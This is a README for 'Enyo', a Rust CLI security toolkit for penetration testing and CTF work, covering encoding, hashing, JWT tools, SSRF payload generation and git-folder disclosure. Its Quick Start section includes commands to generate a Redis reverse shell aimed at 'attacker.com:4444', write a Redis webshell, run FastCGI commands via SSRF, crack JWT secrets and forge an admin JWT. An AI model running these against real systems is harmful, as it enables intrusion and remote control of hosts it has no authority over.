<p align="center">
  <img src="https://img.shields.io/badge/Rust-2021-orange?logo=rust" alt="Rust 2021">
  <img src="https://img.shields.io/badge/License-MIT-blue" alt="MIT License">
  <img src="https://img.shields.io/badge/Version-0.1.0-green" alt="Version">
</p>

<h1 align="center">⚔️ Enyo</h1>

<p align="center">
  <b>The Cyber Swiss Army Knife for Terminal</b>
</p>

<p align="center">
  A powerful command-line toolkit built with Rust, providing various security and encoding utilities for penetration testing, CTF competitions, and daily development tasks.
</p>

---

## ✨ Features

### 🔐 Encoding & Decoding
| Command | Alias | Description                                           |
| ------- | ----- | ----------------------------------------------------- |
| `basex` | `bx`  | Base encoding/decoding (Base16/32/36/58/62/64/91/100) |
| `basic` | -     | URL encode/decode, Hex, ASCII, XOR, Random string     |

### 🔒 Cryptography
| Command   | Alias | Description                                                              |
| --------- | ----- | ------------------------------------------------------------------------ |
| `hash`    | -     | Hash functions (MD2/4/5, SHA1/2/3, RIPEMD160, bcrypt, MySQL, NTLM, HMAC) |
| `hashpow` | `pow` | Hash Proof of Work brute force (MD5/SHA1)                                |
| `encrypt` | `enc` | File encryption with AES-CTR                                             |

### 🔑 Authentication
| Command   | Alias | Description                   |
| --------- | ----- | ----------------------------- |
| `jwttool` | `jwt` | JWT Print/Crack/Modify/Create |

### 🌐 Network & Security
| Command   | Alias  | Description                                        |
| --------- | ------ | -------------------------------------------------- |
| `gopher`  | `gop`  | Generate Gopher SSRF payloads (FastCGI/HTTP/Redis) |
| `fastcgi` | `fcgi` | FastCGI protocol record generator                  |
| `githack` | `gh`   | Git folder disclosure exploit tool                 |
| `sitemap` | `sm`   | Generate sitemap.xml from URLs                     |

### 🛠️ Utilities
| Command      | Alias  | Description                       |
| ------------ | ------ | --------------------------------- |
| `timestamp`  | `ts`   | Parse and convert timestamps      |
| `qrcode`     | `qr`   | QR code generate and parse        |
| `parser`     | -      | Parse DS_Store, /proc/net files   |
| `wechat`     | `vx`   | Decrypt WeChat database files     |
| `completion` | `comp` | Generate shell completion scripts |

---

## 📦 Installation

### From Source

```bash
# Clone the repository
git clone https://github.com/virzz/enyo-rs.git
cd enyo-rs

# Build release version
cargo build --release

# Install to ~/.cargo/bin
cargo install --path . --bin enyo
```

### Via Homebrew (macOS)

```bash
brew tap virzz/enyo
brew install enyo
```

---

## 🚀 Quick Start

### Base Encoding

```bash
# Base64 encode
enyo basex b64e "Hello World"
# Output: SGVsbG8gV29ybGQ=

# Base64 decode
enyo bx b64d "SGVsbG8gV29ybGQ="
# Output: Hello World

# Auto-detect and decode (fuzzing mode)
enyo bx "SGVsbG8gV29ybGQ="
```

### Hash Calculation

```bash
# MD5 hash
enyo hash md5 "password"
# Output: 5f4dcc3b5aa765d61d8327deb882cf99

# SHA256 hash
enyo hash sha2 -t 256 "password"

# SHA256 with HMAC
enyo hash sha2 -t 256 -s "secret_key" "message"

# bcrypt generate
enyo hash bcrypt gen "password"

# MySQL password hash
enyo hash mysql5 "password"
```

### JWT Tools

```bash
# Print JWT content
enyo jwt jwtp "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Modify JWT claims
enyo jwt jwtm -t "token" -c "role=admin" -s "secret"

# Crack JWT secret
enyo jwt jwtc -t "token" -m 1 -l 6

# Create new JWT
enyo jwt jwtg -c "name=test" -c "role=admin" -s "secret"
```

### Gopher SSRF Payloads

```bash
# FastCGI exploit payload
enyo gopher fastcgi -t "127.0.0.1:9000" -c "id"

# Redis write webshell
enyo gopher webshell -t "127.0.0.1:6379" -n "shell.php"

# Redis reverse shell
enyo gopher reverse -t "127.0.0.1:6379" -r "attacker.com:4444"
```

### Git Hack

```bash
# Exploit .git folder disclosure
enyo githack "http://example.com/.git/"
```

### Basic Utilities

```bash
# URL encode
enyo basic urle "hello world"
# Output: hello%20world

# Hex to string
enyo basic h2s "48656c6c6f"
# Output: Hello

# Generate random string
enyo basic rstr 16 -x  # 16 chars hex string

# XOR two strings
enyo basic xor "aaaa" "1111"
```

### File Encryption

```bash
# Encrypt file
enyo encrypt -k "12345678901234567890123456789012" file.txt

# Check if file is encrypted
enyo encrypt -c file.txt
```

### Timestamp

```bash
# Get current timestamp
enyo ts

# Parse timestamp to datetime
enyo ts 1736441819
# Output: 2025-01-09 18:30:19

# Parse datetime to timestamp
enyo ts "2025-01-09 18:30:19"
# Output: 1736441819
```

### QR Code

```bash
# Generate QR code to terminal
enyo qr qrgen "https://example.com"

# Generate QR code to file
enyo qr qrgen -o qrcode.png "https://example.com"

# Binary string to QR code
enyo qr qrbs "100110101001..."
```

---

## 🔧 Shell Completion

Generate shell completion scripts:

```bash
# Bash
enyo completion bash > ~/.bash_completion.d/enyo

# Zsh
enyo completion zsh > ~/.zfunc/_enyo

# Fish
enyo completion fish > ~/.config/fish/completions/enyo.fish

# PowerShell
enyo completion powershell > enyo.ps1
```

---

## 📖 Workspace Crates

The CLI and command modules are organized as a Cargo workspace:

```bash
# Build the main CLI
cargo build --release

# Test all workspace members
cargo test --workspace
```

- `crates/enyo`: source directory for the root `enyo` package
- `crates/core`: shared input/output and action traits
- `crates/*`: one library crate per command module

---

## 🧪 Development

```bash
# Run tests
cargo test

# Run clippy
cargo clippy

# Format code
cargo fmt

# Build documentation
cargo doc --open
```

---

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <i>Named after Enyo (Ἐνυώ) - the Greek goddess of war and destruction</i>
</p>
